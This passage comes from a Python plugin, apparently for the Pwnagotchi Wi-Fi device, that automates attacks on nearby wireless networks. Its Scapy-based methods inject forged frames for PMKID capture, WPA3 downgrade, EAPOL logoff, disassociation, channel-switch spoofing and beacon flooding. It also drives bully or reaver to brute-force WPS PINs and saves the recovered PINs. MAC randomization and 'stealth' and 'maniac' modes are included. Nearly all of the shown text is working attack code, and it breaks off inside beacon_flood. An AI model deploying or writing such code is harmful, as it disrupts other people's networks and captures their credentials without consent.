        cpu_count = multiprocessing.cpu_count()
        workers = max(5, min(20, cpu_count * 2))
        self.executor = ThreadPoolExecutor(max_workers=workers)
        self.logger.info(f"ThreadPoolExecutor started with {workers} workers")

        agent.run("wifi.clear")
        status = "Maniac engaged!" if self.effective_mode == "maniac" else \
                 "Stealth mode..." if self.effective_mode == "stealth" else "Tactical probe..."
        if not self.scapy_available and not self.use_external_tools:
            status = "PMF off (no Scapy/tools)"
        agent._view.set('pnp_status', status)

    # ------------------------------------------------------------------
    # on_unload
    # ------------------------------------------------------------------
    def on_unload(self, ui):
        self._watchdog_running = False
        self._sniffer_running = False
        self._client_cap_sniffer_running = False
        self.upload_running = False
        if self._watchdog_thread:
            self._watchdog_thread.join(timeout=5.0)
        if self._sniffer_thread:
            self._sniffer_thread.join(timeout=5.0)
        if self._client_cap_sniffer_thread:
            self._client_cap_sniffer_thread.join(timeout=5.0)
        if self.upload_thread and self.upload_thread.is_alive():
            self.upload_thread.join(timeout=5.0)

        with self.external_processes_lock:
            for proc in self.external_processes:
                if proc.poll() is None:
                    proc.terminate()
                    try:
                        proc.wait(timeout=5)
                    except subprocess.TimeoutExpired:
                        proc.kill()
            self.external_processes.clear()

        self._save_blacklist()
        self._save_state()
        if self.executor:
            self.executor.shutdown(wait=False)
        self.logger.info("ProbeNpwn unloaded")

    # ------------------------------------------------------------------
    # UI setup
    # ------------------------------------------------------------------
    def on_ui_setup(self, ui):
        if self.ui_initialized:
            return
        if self.show_attacks:
            ui.add_element('attacks', components.Text(position=self.ui_positions['attacks'], value='Attacks: 0', color=255))
        if self.show_success:
            ui.add_element('success', components.Text(position=self.ui_positions['success'], value='Success: 0.0%', color=255))
        if self.show_handshakes:
            ui.add_element('handshakes', components.Text(position=self.ui_positions['handshakes'], value='Handshakes: 0', color=255))
        if self.show_mode:
            ui.add_element('mode', components.Text(position=self.ui_positions['mode'], value='Mode: tactical', color=255))
        if self.show_top_channels:
            ui.add_element('top_channels', components.Text(position=self.ui_positions['top_channels'], value='Ch: 1,6,11', color=255))
        if self.show_pmf_status:
            ui.add_element('pmf_status', components.Text(position=self.ui_positions['pmf_status'], value='PMF: off', color=255))
        if self.show_success_bar:
            ui.add_element('success_bar', components.Text(position=self.ui_positions['success_bar'], value='[____]', color=255))
        if self.show_pnp_status:
            ui.add_element('pnp_status', components.Text(position=self.ui_positions['pnp_status'], value='Probe ready', color=255))
        if self.show_attack_rate:
            ui.add_element('attack_rate', components.Text(position=self.ui_positions['attack_rate'], value='Rate: 0/s', color=255))
        if self.show_top_targets:
            ui.add_element('top_targets', components.Text(position=self.ui_positions['top_targets'], value='Top: -', color=255))
        if self.show_gps_indicator:
            ui.add_element('gps_indicator', components.Text(position=self.ui_positions['gps_indicator'], value='GPS: no', color=255))
        if self.show_eta:
            ui.add_element('eta', components.Text(position=self.ui_positions['eta'], value='ETA: -', color=255))
        if self.show_pmf_method:
            ui.add_element('pmf_method', components.Text(position=self.ui_positions['pmf_method'], value='PMF: -', color=255))
        if self.show_ext_procs:
            ui.add_element('ext_procs', components.Text(position=self.ui_positions['ext_procs'], value='Ext: 0', color=255))
        if self.show_battery:
            ui.add_element('battery', components.Text(position=self.ui_positions['battery'], value='Batt: -', color=255))
        self.ui_initialized = True

    # ------------------------------------------------------------------
    # UI update (batched)
    # ------------------------------------------------------------------
    def on_ui_update(self, ui):
        now = time.time()
        if now - self.last_ui_update < self.ui_update_interval:
            return
        self.last_ui_update = now

        total_attempts = sum(self.attack_attempts.values())
        total_success = sum(self.success_counts.values())
        success_rate = (total_success / total_attempts * 100) if total_attempts else 0.0

        if self.show_attacks:
            ui.set('attacks', f"Attacks: {total_attempts}")
        if self.show_success:
            ui.set('success', f"Success: {success_rate:.1f}%")
        if self.show_handshakes:
            with self.handshake_lock:
                handshake_count = len(self.handshake_db)
            ui.set('handshakes', f"Handshakes: {handshake_count}")
        if self.show_mode:
            ui.set('mode', f"Mode: {self.effective_mode}")
        if self.show_pmf_status:
            ui.set('pmf_status', f"PMF: {'on' if self.pmf_bypass_methods else 'off'}")
        if self.show_top_channels:
            top_ch = self._get_top_channels(3)
            ui.set('top_channels', f"Ch: {','.join(str(ch) for ch in top_ch)}")
        if self.show_success_bar:
            bar_len = 20
            filled = int(success_rate / 100 * bar_len)
            bar = '[' + '#'*filled + '_'*(bar_len-filled) + ']'
            ui.set('success_bar', bar)
        if self.show_attack_rate:
            elapsed = now - self.last_attack_count_reset
            if elapsed >= 10:
                self.attack_rate_value = self.attack_count_epoch / elapsed
                self.attack_count_epoch = 0
                self.last_attack_count_reset = now
            ui.set('attack_rate', f"Rate: {self.attack_rate_value:.2f}/s")
        if self.show_top_targets:
            top_aps = sorted(self.success_counts.items(), key=lambda x: x[1], reverse=True)[:3]
            top_str = ','.join([f"{mac[:8]}" for mac, _ in top_aps]) if top_aps else '-'
            ui.set('top_targets', f"Top: {top_str}")
        if self.show_gps_indicator:
            gps = self.agent.session().get('gps', {}) if self.agent else {}
            self.gps_locked = 'Latitude' in gps and gps['Latitude'] != 0
            ui.set('gps_indicator', f"GPS: {'yes' if self.gps_locked else 'no'}")
        if self.show_eta:
            if self.attack_rate_value > 0 and total_success > 0:
                remaining = max(1, len(self.ap_client_groups) - total_success)
                self.eta_seconds = remaining / self.attack_rate_value * 3600
                ui.set('eta', f"ETA: {int(self.eta_seconds//3600)}h{int((self.eta_seconds%3600)//60)}m")
            else:
                ui.set('eta', 'ETA: -')
        if self.show_pmf_method:
            ui.set('pmf_method', f"PMF: {self.current_pmf_method or 'none'}")
        if self.show_ext_procs:
            with self.external_processes_lock:
                active = sum(1 for p in self.external_processes if p.poll() is None)
            ui.set('ext_procs', f"Ext: {active}")
        if self.show_battery and psutil and hasattr(psutil, 'sensors_battery'):
            batt = psutil.sensors_battery()
            if batt:
                ui.set('battery', f"Batt: {batt.percent}%{'🔌' if batt.power_plugged else ''}")
            else:
                ui.set('battery', 'Batt: -')

    def _get_top_channels(self, n: int) -> List[int]:
        period = self._get_time_period()
        scores = []
        for ch in self.possible_channels:
            visits = self.channel_visits.get(ch, 0)
            if visits == 0:
                scores.append((float('inf'), ch))
                continue
            reward = self.channel_success[ch] / visits
            explore = math.sqrt(2 * math.log(max(1, self.total_channel_visits)) / visits)
            bonus = (self.channel_activity[ch]["aps"] + self.channel_activity[ch]["clients"]) / 10
            period_bonus = self.channel_time_pattern[period].get(ch, 0) * 0.1
            scores.append((reward + explore + bonus + period_bonus, ch))
        scores.sort(reverse=True)
        return [ch for _, ch in scores[:n]]

    # ------------------------------------------------------------------
    # Watchdog thread
    # ------------------------------------------------------------------
    def _watchdog(self):
        while self._watchdog_running:
            try:
                if self.agent is None:
                    time.sleep(1)
                    continue
                for iface in (self.monitor_iface, self.inject_iface):
                    if iface and not os.path.exists(f"/sys/class/net/{iface}"):
                        self.logger.error(f"Interface {iface} missing – attempting recovery")
                        try:
                            subprocess.run(["monstop"], check=False, timeout=10)
                            subprocess.run(["monstart"], check=False, timeout=10)
                        except (subprocess.TimeoutExpired, subprocess.CalledProcessError, OSError) as e:
                            self.logger.error(f"Interface recovery failed: {e}", exc_info=True)
                        break

                channel = self.select_channel()
                if channel not in self.possible_channels or channel < 1:
                    self.logger.warning(f"Invalid channel {channel} selected, falling back to random")
                    channel = random.choice(self.possible_channels) if self.possible_channels else 1
                self.agent.set_channel(channel)
                self.channel_visits[channel] += 1
                self.total_channel_visits += 1

                period = self._get_time_period()
                self.channel_time_pattern[period][channel] += 1

                time.sleep(10)
            except Exception as e:
                self.logger.exception("Error in watchdog thread")

    # ------------------------------------------------------------------
    # Sniffer thread for SAE capture
    # ------------------------------------------------------------------
    def _sniffer_loop(self):
        if not self.scapy_available:
            self.logger.warning("Scapy not available, sniffer disabled")
            return
        def handle_pkt(pkt):
            if not self._sniffer_running:
                return
            try:
                if pkt.haslayer(Dot11Auth) and pkt[Dot11Auth].algo == 3:
                    ap_mac = pkt.addr1
                    cl_mac = pkt.addr2
                    self.logger.debug(f"SAE auth frame from {cl_mac} to {ap_mac}")
                    self._handle_potential_handshake(ap_mac, cl_mac, "SAE")
            except Exception as e:
                self.logger.exception("Error in SAE sniffer")
        sniff(iface=self.monitor_iface, prn=handle_pkt, store=0)

    # ------------------------------------------------------------------
    # Client capability sniffer
    # ------------------------------------------------------------------
    def _client_cap_sniffer(self):
        if not self.scapy_available:
            return
        def handle_pkt(pkt):
            if not self._client_cap_sniffer_running:
                return
            try:
                if pkt.haslayer(Dot11ProbeReq) or pkt.haslayer(Dot11AssoReq):
                    cl_mac = pkt.addr2
                    cl = {'mac': cl_mac}
                    self._parse_client_capabilities(cl, packet=bytes(pkt))
            except Exception as e:
                self.logger.exception("Error in client cap sniffer")
        sniff(iface=self.monitor_iface, prn=handle_pkt, store=0)

    def _handle_potential_handshake(self, ap_mac, cl_mac, method):
        pass

    # ------------------------------------------------------------------
    # Channel selection
    # ------------------------------------------------------------------
    def select_channel(self) -> int:
        if not self.channel_visits:
            return random.choice(self.possible_channels)

        log_total = math.log(max(1, self.total_channel_visits))
        period = self._get_time_period()
        ucb = {}
        for ch in self.possible_channels:
            visits = self.channel_visits.get(ch, 0)
            if visits == 0:
                ucb[ch] = float('inf')
                continue
            reward = self.channel_success[ch] / visits
            explore = math.sqrt(2 * log_total / visits)
            bonus = (self.channel_activity[ch]["aps"] + self.channel_activity[ch]["clients"]) / 10
            period_bonus = self.channel_time_pattern[period].get(ch, 0) * 0.1
            ucb[ch] = reward + explore + bonus + period_bonus

        return max(ucb, key=ucb.get)

    # ------------------------------------------------------------------
    # Tracking recent APs/clients
    # ------------------------------------------------------------------
    def track_recent(self, ap: dict, cl: dict = None):
        now = time.time()
        ap_mac = ap['mac'].lower()
        ap['_track_time'] = now
        self.recents.put(ap_mac, ap)
        if cl:
            cl_mac = cl['mac'].lower()
            cl['_track_time'] = now
            self.recents.put(cl_mac, cl)

    # ------------------------------------------------------------------
    # Attack eligibility checks
    # ------------------------------------------------------------------
    def ok_to_attack(self, agent, ap: dict) -> bool:
        mac = ap['mac'].lower()
        if mac in self.whitelist or ap.get('hostname', '').lower() in self.whitelist:
            return False
        min_rssi = self.get_scaled_param('min_rssi')
        if ap.get('rssi', -100) < min_rssi:
            return False
        expiry = self.blacklist.get(mac)
        if expiry and time.time() < expiry:
            return False
        if self.effective_mode == "tactical":
            cooldown = self.cooldowns.get(mac)
            if cooldown and time.time() < cooldown:
                return False
        return True

    # ------------------------------------------------------------------
    # Scaled parameter
    # ------------------------------------------------------------------
    def get_scaled_param(self, name: str) -> float:
        lo, hi = self.scaling_bounds.get(name, (0, 1))
        s = self.mobility_score
        if name in ['throttle_a', 'throttle_d']:
            return hi - s * (hi - lo)
        else:
            return lo + s * (hi - lo)

    # ------------------------------------------------------------------
    # Mobility score calculation (with GPS pruning)
    # ------------------------------------------------------------------
    def calculate_mobility_score(self, agent) -> float:
        gps = agent.session().get('gps', {})
        now = time.time()
        if 'Latitude' not in gps or gps['Latitude'] == 0:
            return min(1.0, self.new_aps_per_epoch / 20.0)

        cur = {'Latitude': gps['Latitude'], 'Longitude': gps['Longitude']}
        self.gps_history.append((now, cur))

        while self.gps_history and now - self.gps_history[0][0] > GPS_HISTORY_MAX_AGE:
            self.gps_history.popleft()

        if len(self.gps_history) < 2:
            return min(1.0, self.new_aps_per_epoch / 20.0)

        speeds = []
        for i in range(1, len(self.gps_history)):
            t_prev, g_prev = self.gps_history[i-1]
            t_cur, g_cur = self.gps_history[i]
            dt = max(2.0, t_cur - t_prev)
            lat1 = math.radians(g_prev['Latitude'])
            lon1 = math.radians(g_prev['Longitude'])
            lat2 = math.radians(g_cur['Latitude'])
            lon2 = math.radians(g_cur['Longitude'])
            d = 6371 * 2 * math.asin(math.sqrt(
                math.sin((lat2-lat1)/2)**2 + math.cos(lat1)*math.cos(lat2)*math.sin((lon2-lon1)/2)**2
            ))
            speed = min(300.0, (d / dt) * 3600)
            speeds.append(speed)

        speed_norm = sorted(speeds)[len(speeds)//2] / 50.0 if speeds else 0.0
        ap_norm = min(1.0, self.new_aps_per_epoch / 20.0)
        return min(1.0, max(speed_norm, ap_norm))

    # ------------------------------------------------------------------
    # Dynamic attack delay (with exponential backoff)
    # ------------------------------------------------------------------
    def dynamic_attack_delay(self, ap: dict, cl: dict = None, retry: int = 0) -> float:
        key = (ap['mac'].lower(), cl['mac'].lower() if cl else '')
        cached = self.delay_cache.get(key)
        if cached is not None:
            return cached

        rssi = max(ap.get('rssi', -100), cl.get('rssi', -100) if cl else -100)

        if self.effective_mode == "maniac":
            base = 0.05
        elif self.effective_mode == "stealth":
            base = 0.5
        else:
            base = 0.1 if rssi >= -60 else 0.2
            attempts = self.attack_attempts[ap['mac'].lower()]
            if attempts > 5:
                base *= 0.4
            num_clients = len(self.ap_client_groups.get(ap['mac'].lower(), []))
            if num_clients > 3:
                base *= 0.8
        delay = base * (self.exp_backoff_base ** retry) * (0.95 + random.random() * 0.1)

        self.delay_cache.put(key, delay)
        return delay

    # ------------------------------------------------------------------
    # Rate limiter (adaptive per AP, with cleanup)
    # ------------------------------------------------------------------
    def _rate_limit_ap(self, ap_mac: str) -> bool:
        with self.rate_limiter_lock:
            if ap_mac not in self.rate_limiters:
                self.rate_limiters[ap_mac] = AdaptiveTokenBucket(
                    self.rate_limit_refill_rate, self.rate_limit_max_tokens)
            return self.rate_limiters[ap_mac].consume()

    def _cleanup_rate_limiters(self):
        with self.rate_limiter_lock:
            now = time.time()
            to_remove = []
            for mac, limiter in self.rate_limiters.items():
                if not self.recents.get(mac) and not self.blacklist.get(mac) and not self.cooldowns.get(mac):
                    if now - limiter.last_refill > 600:
                        to_remove.append(mac)
            for mac in to_remove:
                del self.rate_limiters[mac]

    # ------------------------------------------------------------------
    # PMF Bypass Attacks
    # ------------------------------------------------------------------
    def _pmf_assoc_sleep(self, ap: dict, client_macs: List[str]):
        if not client_macs:
            return
        for cl_mac in client_macs[:2]:
            pkt = RadioTap() / Dot11(
                addr1=ap['mac'],
                addr2=cl_mac,
                addr3=ap['mac'],
                FCfield="pwrmgt"
            ) / Dot11AssoReq(listen_interval=0) / Dot11Elt(ID=0, len=0)
            try:
                sendp(pkt, iface=self.inject_iface, count=2, inter=0.1, verbose=0)
                self.logger.debug(f"PMF assoc_sleep to {cl_mac}")
            except (OSError, IOError, AttributeError) as e:
                self.logger.debug(f"assoc_sleep failed: {e}")

    def _pmf_bad_msg(self, ap: dict, client_macs: List[str]):
        if not client_macs:
            return
        bad_eapol = EAPOL(version=0xff, type=3, len=5) / Raw(b'AAAAA')
        for cl_mac in client_macs[:2]:
            pkt = RadioTap() / Dot11(
                addr1=ap['mac'],
                addr2=cl_mac,
                addr3=ap['mac'],
                FCfield="to-DS"
            ) / LLC(dsap=0xaa, ssap=0xaa, ctrl=0x03) / SNAP() / bad_eapol
            try:
                sendp(pkt, iface=self.inject_iface, count=2, inter=0.1, verbose=0)
            except (OSError, IOError, AttributeError) as e:
                self.logger.debug(f"bad_msg failed: {e}")

    def _pmf_rsn_corrupt(self, ap: dict, client_macs: List[str]):
        if not client_macs:
            return
        self.rsn_corrupt_variants(ap, client_macs)

    def _pmf_frag(self, ap: dict, client_macs: List[str]):
        if not client_macs:
            return
        self.frag_variants(ap, client_macs)

    # ------------------------------------------------------------------
    # New Quiet Association Attacks (no deauth)
    # ------------------------------------------------------------------
    def pmkid_association_attack(self, ap: dict, ap_caps: dict = None):
        """Request PMKID directly from AP via association."""
        if not self.scapy_available or not self.enable_pmkid_attack:
            return
        # Construct RSN IE with PMKID request (properly formatted)
        rsn = Dot11EltRSN(
            ID=48,
            len=20,
            version=1,
            group_cipher=4,  # CCMP
            pairwise_count=1,
            pairwise_ciphers=4,  # CCMP
            akm_count=1,
            akm_suites=2,  # PSK
            rsn_capabilities=0
        )
        # Use random client MAC
        src_mac = self._get_random_mac() if self.mac_randomization else "00:11:22:33:44:55"
        pkt = RadioTap() / Dot11(
            addr1=ap['mac'],
            addr2=src_mac,
            addr3=ap['mac']
        ) / Dot11AssoReq(listen_interval=0) / rsn
        try:
            sendp(pkt, iface=self.inject_iface, count=3, inter=0.1, verbose=0)
            self.logger.debug(f"PMKID association request sent to {ap['mac']}")
        except (OSError, IOError, AttributeError) as e:
            self.logger.debug(f"PMKID attack failed: {e}")

    def auth_frame_harvest(self, ap: dict, ap_caps: dict = None):
        """Send authentication frames to trigger handshake material."""
        if not self.scapy_available or not self.enable_auth_harvest:
            return
        src_mac = self._get_random_mac() if self.mac_randomization else "00:11:22:33:44:55"
        for algo in [0, 1, 2]:  # Open, Shared Key, FT
            pkt = RadioTap() / Dot11(
                addr1=ap['mac'],
                addr2=src_mac,
                addr3=ap['mac']
            ) / Dot11Auth(algo=algo, seqnum=1, status=0)
            try:
                sendp(pkt, iface=self.inject_iface, count=2, inter=0.05, verbose=0)
            except (OSError, IOError, AttributeError):
                continue

    def reassociation_pmkid_attack(self, ap: dict, ap_caps: dict = None):
        """Use reassociation to trigger PMKID response."""
        if not self.scapy_available or not self.enable_reassociation:
            return
        src_mac = self._get_random_mac() if self.mac_randomization else "00:11:22:33:44:55"
        pkt = RadioTap() / Dot11(
            addr1=ap['mac'],
            addr2=src_mac,
            addr3=ap['mac']
        ) / Dot11ReassoReq(listen_interval=0) / Dot11Elt(
            ID=0, len=len(ap.get('hostname', '')), info=ap.get('hostname', '').encode()
        )
        try:
            sendp(pkt, iface=self.inject_iface, count=3, inter=0.1, verbose=0)
            self.logger.debug(f"Reassociation PMKID request to {ap['mac']}")
        except (OSError, IOError, AttributeError) as e:
            self.logger.debug(f"Reassociation attack failed: {e}")

    def probe_with_rsn(self, ap: dict, ap_caps: dict = None):
        """Probe request with RSN IE to trigger capability disclosure."""
        if not self.scapy_available or not self.enable_rsn_probe:
            return
        # RSN IE indicating WPA3/FT support
        rsn = Dot11EltRSN(
            ID=48,
            len=20,
            version=1,
            group_cipher=4,
            pairwise_count=1,
            pairwise_ciphers=4,
            akm_count=1,
            akm_suites=8,  # SAE (WPA3)
            rsn_capabilities=0
        )
        src_mac = self._get_random_mac() if self.mac_randomization else "00:11:22:33:44:55"
        pkt = RadioTap() / Dot11(
            addr1=ap['mac'],
            addr2=src_mac,
            addr3=ap['mac']
        ) / Dot11ProbeReq() / Dot11Elt(
            ID=0, len=len(ap.get('hostname', '')), info=ap.get('hostname', '').encode()
        ) / rsn
        try:
            sendp(pkt, iface=self.inject_iface, count=2, inter=0.1, verbose=0)
            self.logger.debug(f"RSN probe sent to {ap['mac']}")
        except (OSError, IOError, AttributeError) as e:
            self.logger.debug(f"RSN probe failed: {e}")

    def csa_probe(self, ap: dict):
        """Use CSA to trigger client responses (already in csa_attack, but keep for completeness)."""
        pass

    # ------------------------------------------------------------------
    # WPS Attack with PIN capture
    # ------------------------------------------------------------------
    def wps_attack(self, ap: dict, ap_caps: dict = None):
        if not self.enable_wps:
            return
        # Use snapshot if provided, otherwise look up
        if ap_caps is None:
            with self.ap_cap_lock:
                ap_caps = self.ap_capabilities.get(ap['mac'].lower(), {})
        if not ap_caps.get('wps', False):
            return
        tool = None
        if self.external_tools.get('bully'):
            tool = 'bully'
        elif self.external_tools.get('reaver'):
            tool = 'reaver'
        if not tool:
            return

        if self.dry_run:
            self.logger.info(f"DRY RUN: would start {tool} on {ap['mac']}")
            return

        if not self.external_semaphore.acquire(blocking=False):
            self.logger.debug(f"Too many external processes, skipping WPS on {ap['mac']}")
            return

        cmd = [tool, "-b", ap['mac'], "-i", self.inject_iface]
        try:
            proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                                    universal_newlines=True, bufsize=1)
            with self.external_processes_lock:
                self.external_processes.append(proc)
            self.logger.info(f"Started WPS attack on {ap['mac']} with {tool} (PID {proc.pid})")

            threading.Thread(target=self._monitor_wps_output, args=(proc, ap['mac'], tool), daemon=True).start()
        except (OSError, subprocess.SubprocessError) as e:
            self.logger.debug(f"WPS attack failed: {e}")
            self.external_semaphore.release()

    def _monitor_wps_output(self, proc: subprocess.Popen, bssid: str, tool: str):
        """Read output from bully/reaver, extract PIN, and save to file."""
        pin = None
        try:
            for line in proc.stdout:
                line = line.strip()
                self.logger.debug(f"[{tool}] {line}")
                if tool == 'reaver':
                    match = REAVER_PIN_REGEX.search(line)
                    if match:
                        pin = match.group(1)
                        proc.terminate()  # Stop process early
                        break
                elif tool == 'bully':
                    match = BULLY_PIN_REGEX.search(line)
                    if match:
                        pin = match.group(1)
                        proc.terminate()
                        break
        except (OSError, IOError, ValueError) as e:
            self.logger.debug(f"Error reading {tool} output: {e}")
        finally:
            try:
                proc.wait(timeout=300)
            except subprocess.TimeoutExpired:
                proc.kill()
                proc.wait()
            with self.external_processes_lock:
                if proc in self.external_processes:
                    self.external_processes.remove(proc)
            self.external_semaphore.release()

        if pin:
            self._save_wps_pin(bssid, pin, tool)
        else:
            self.logger.debug(f"No PIN found from {tool} on {bssid}")

    def _save_wps_pin(self, bssid: str, pin: str, tool: str):
        """Save WPS PIN to a file in pin_save_path."""
        filename = os.path.join(self.pin_save_path, f"{bssid.replace(':', '')}_{tool}.pin")
        try:
            with open(filename, 'w') as f:
                f.write(f"BSSID: {bssid}\nPIN: {pin}\nTool: {tool}\nTime: {time.ctime()}\n")
            self.logger.info(f"WPS PIN saved to {filename}")
        except (OSError, IOError) as e:
            self.logger.error(f"Failed to save WPS PIN: {e}", exc_info=True)

    # ------------------------------------------------------------------
    # Existing attack methods (accept ap_caps snapshot)
    # ------------------------------------------------------------------
    def wpa3_downgrade_attack(self, ap: dict, client_macs: List[str], ap_caps: dict = None):
        if not self.scapy_available or not self.enable_wpa3_downgrade:
            return
        if ap_caps is None:
            with self.ap_cap_lock:
                ap_caps = self.ap_capabilities.get(ap['mac'].lower(), {})
        if not ap_caps.get('wpa3', False):
            return
        rsn_ie = Dot11EltRSN(
            ID=48,
            len=20,
            version=1,
            group_cipher=4,
            pairwise_count=1,
            pairwise_ciphers=4,
            akm_count=1,
            akm_suites=2,
            rsn_capabilities=0
        )
        for cl_mac in client_macs[:3]:
            pkt = RadioTap() / Dot11(
                addr1=cl_mac,
                addr2=ap['mac'],
                addr3=ap['mac'],
                type=0, subtype=5
            ) / Dot11ProbeResp(
                timestamp=0,
                beacon_interval=100,
                cap=0x2100
            ) / Dot11Elt(ID=0, len=len(ap.get('hostname','')), info=ap.get('hostname','')) / rsn_ie
            try:
                sendp(pkt, iface=self.inject_iface, count=1, inter=0.1, verbose=0)
            except (OSError, IOError, AttributeError) as e:
                self.logger.debug(f"WPA3 downgrade failed: {e}")

    def ft_handshake_attack(self, ap: dict, client_macs: List[str], ap_caps: dict = None):
        if not self.scapy_available or not self.enable_ft_handshake:
            return
        if ap_caps is None:
            with self.ap_cap_lock:
                ap_caps = self.ap_capabilities.get(ap['mac'].lower(), {})
        if not ap_caps.get('ft', False):
            return
        for cl_mac in client_macs[:3]:
            pkt = RadioTap() / Dot11(
                addr1=ap['mac'],
                addr2=cl_mac,
                addr3=ap['mac']
            ) / Dot11Auth(algo=2, seqnum=1, status=0)
            try:
                sendp(pkt, iface=self.inject_iface, count=3, inter=0.1, verbose=0)
            except (OSError, IOError, AttributeError) as e:
                self.logger.debug(f"FT handshake attack failed: {e}")

    def tdls_attack(self, ap: dict, client_macs: List[str], ap_caps: dict = None, client_caps_list: List[dict] = None):
        if not self.scapy_available or not self.enable_tdls or len(client_macs) < 2:
            return
        if ap_caps is None:
            with self.ap_cap_lock:
                ap_caps = self.ap_capabilities.get(ap['mac'].lower(), {})
        if not ap_caps.get('tdls', False):
            return
        # Build list of TDLS-capable clients from snapshot
        tdls_clients = []
        if client_caps_list:
            for cl_caps in client_caps_list:
                if cl_caps.get('tdls', False):
                    tdls_clients.append(cl_caps['mac'])
        else:
            with self.client_cap_lock:
                for cl_mac in client_macs:
                    cl_caps = self.client_capabilities.get(cl_mac, {})
                    if cl_caps.get('tdls', False):
                        tdls_clients.append(cl_mac)
        if len(tdls_clients) < 2:
            return
        cl1, cl2 = tdls_clients[0], tdls_clients[1]
        pkt = RadioTap() / Dot11(
            addr1=cl1,
            addr2=cl2,
            addr3=ap['mac']
        ) / Dot11Action(category=12) / Raw(load=b'\x00')
        try:
            sendp(pkt, iface=self.inject_iface, count=2, inter=0.2, verbose=0)
        except (OSError, IOError, AttributeError) as e:
            self.logger.debug(f"TDLS attack failed: {e}")

    def mesh_attack(self, ap: dict, client_macs: List[str], ap_caps: dict = None):
        if not self.scapy_available or not self.enable_mesh:
            return
        if ap_caps is None:
            with self.ap_cap_lock:
                ap_caps = self.ap_capabilities.get(ap['mac'].lower(), {})
        if not ap_caps.get('mesh', False):
            return
        for cl_mac in client_macs[:2]:
            pkt = RadioTap() / Dot11(
                addr1=ap['mac'],
                addr2=cl_mac,
                addr3=ap['mac']
            ) / Dot11Action(category=14) / Raw(load=b'\x01')
            try:
                sendp(pkt, iface=self.inject_iface, count=2, inter=0.2, verbose=0)
            except (OSError, IOError, AttributeError) as e:
                self.logger.debug(f"Mesh attack failed: {e}")

    def eapol_start_injection(self, ap: dict, client_macs: List[str], ap_caps: dict = None):
        if not self.scapy_available or not self.enable_eapol_start:
            return
        if ap_caps is None:
            with self.ap_cap_lock:
                ap_caps = self.ap_capabilities.get(ap['mac'].lower(), {})
        if not ap_caps.get('enterprise', False):
            return
        eapol_start = EAPOL(version=1, type=1, len=0)
        for cl_mac in client_macs[:3]:
            pkt = RadioTap() / Dot11(
                addr1=ap['mac'],
                addr2=cl_mac,
                addr3=ap['mac'],
                FCfield="to-DS"
            ) / LLC(dsap=0xaa, ssap=0xaa, ctrl=0x03) / SNAP() / eapol_start
            try:
                sendp(pkt, iface=self.inject_iface, count=2, inter=0.1, verbose=0)
            except (OSError, IOError, AttributeError) as e:
                self.logger.debug(f"EAPOL-Start injection failed: {e}")

    def eapol_logoff_injection(self, ap: dict, client_macs: List[str], ap_caps: dict = None):
        if not self.scapy_available or not self.enable_eapol_logoff:
            return
        if ap_caps is None:
            with self.ap_cap_lock:
                ap_caps = self.ap_capabilities.get(ap['mac'].lower(), {})
        if not ap_caps.get('enterprise', False):
            return
        eapol_logoff = EAPOL(version=1, type=2, len=0)
        for cl_mac in client_macs[:3]:
            pkt = RadioTap() / Dot11(
                addr1=ap['mac'],
                addr2=cl_mac,
                addr3=ap['mac'],
                FCfield="to-DS"
            ) / LLC(dsap=0xaa, ssap=0xaa, ctrl=0x03) / SNAP() / eapol_logoff
            try:
                sendp(pkt, iface=self.inject_iface, count=2, inter=0.1, verbose=0)
            except (OSError, IOError, AttributeError) as e:
                self.logger.debug(f"EAPOL-Logoff injection failed: {e}")

    def disassociation_attack(self, ap: dict, client_macs: List[str]):
        if not self.scapy_available or not self.enable_disassociation:
            return
        for cl_mac in client_macs[:5]:
            pkt = RadioTap() / Dot11Disas(
                addr1=cl_mac,
                addr2=ap['mac'],
                addr3=ap['mac'],
                reason=8
            )
            try:
                sendp(pkt, iface=self.inject_iface, count=3, inter=0.2, verbose=0)
            except (OSError, IOError, AttributeError) as e:
                self.logger.debug(f"Disassociation attack failed: {e}")

    def null_data_attack(self, ap: dict, client_macs: List[str]):
        if not self.scapy_available or not self.enable_null_data:
            return
        for cl_mac in client_macs[:3]:
            pkt_null = RadioTap() / Dot11(
                addr1=ap['mac'],
                addr2=cl_mac,
                addr3=ap['mac'],
                FCfield="pwrmgt"
            ) / Raw(load=b'')
            try:
                sendp(pkt_null, iface=self.inject_iface, count=1, verbose=0)
            except (OSError, IOError, AttributeError) as e:
                self.logger.debug(f"Null data attack (null) failed: {e}")
            pkt_pspoll = RadioTap() / Dot11(
                addr1=ap['mac'],
                addr2=cl_mac,
                addr3=ap['mac'],
                type=1, subtype=10
            ) / Raw(load=b'\x00\x00')
            try:
                sendp(pkt_pspoll, iface=self.inject_iface, count=1, inter=0.1, verbose=0)
            except (OSError, IOError, AttributeError) as e:
                self.logger.debug(f"Null data attack (PS-Poll) failed: {e}")

    def csa_attack(self, ap: dict, client_macs: List[str]):
        if not self.scapy_available or not self.enable_csa:
            return
        current_ch = ap.get('channel', 1)
        if current_ch <= 14:
            candidates = [c for c in range(1, 15) if c != current_ch]
        elif current_ch in self.five_ghz_channels:
            candidates = [c for c in self.five_ghz_channels if c != current_ch]
        elif current_ch in self.six_ghz_channels:
            candidates = [c for c in self.six_ghz_channels if c != current_ch]
        else:
            candidates = [c for c in self.possible_channels if c != current_ch]
        if not candidates:
            candidates = [c for c in self.possible_channels if c != current_ch]
        new_ch = random.choice(candidates) if candidates else 1

        csa_ie = Dot11Elt(ID=37, len=3, info=struct.pack('BBB', 0, new_ch, 0))
        pkt = RadioTap() / Dot11(
            addr1="ff:ff:ff:ff:ff:ff",
            addr2=ap['mac'],
            addr3=ap['mac'],
            type=0, subtype=8
        ) / Dot11Beacon(
            timestamp=0,
            beacon_interval=100,
            cap=0x2100
        ) / Dot11Elt(ID=0, len=len(ap.get('hostname','')), info=ap.get('hostname','')) / csa_ie
        try:
            sendp(pkt, iface=self.inject_iface, count=5, inter=0.05, verbose=0)
        except (OSError, IOError, AttributeError) as e:
            self.logger.debug(f"CSA attack failed: {e}")

    def beacon_flood(self, ap: dict, client_macs: List[str]):
        if not self.scapy_available or not self.enable_beacon_flood or self.effective_mode != "maniac":
            return
        for _ in range(10):
            fake_bssid = self._get_random_mac()
            pkt = RadioTap() / Dot11(
                addr1="ff:ff:ff:ff:ff:ff",
                addr2=fake_bssid,
                addr3=fake_bssid,
                type=0, subtype=8
            ) / Dot11Beacon(
                timestamp=0,
                beacon_interval=100,
                cap=0x2100
            ) / Dot11Elt(ID=0, len=6, info=b'fakeAP')
            try:
